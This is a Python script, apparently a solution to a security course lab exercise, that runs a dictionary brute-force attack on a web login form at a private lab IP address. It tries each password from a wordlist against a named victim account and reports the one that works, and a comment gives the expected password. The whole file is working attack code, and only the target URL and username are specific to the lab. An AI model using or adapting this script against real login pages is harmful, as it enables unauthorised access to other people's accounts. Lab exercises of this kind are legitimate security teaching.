import requests
from time import time

URL = "http://10.13.4.80:80"
victim_username = "V_Shalimar151" 

def post(password_candidate):
    data = {
            "username": victim_username,
            "password": password_candidate,
            "submit": "Sign In"
        }

    response = requests.post(URL, data)
    assert response.status_code == 200

    if "User login" in response.text:
        return password_candidate
    else:  
        return None

def main():
    dictionary_file = "./Lab4/Q2dictionary.txt"
    with open(dictionary_file, "r") as file:
        passwords = [line.strip() for line in file]

    for n_loops, password_candidate in enumerate(passwords):
        
        result = post(password_candidate)
        if result is not None:
            print(f"[+] Password found: {result}\n")
            break
        if n_loops % 1000 == 0 and n_loops != 0:
            print(f"[-] Attempted {n_loops} passwords...\n")
    return

if __name__ == "__main__":
    # expected password: felipe
    start = time()
    main()
    end = time()
    print(f"elapsed: {end-start}\n")
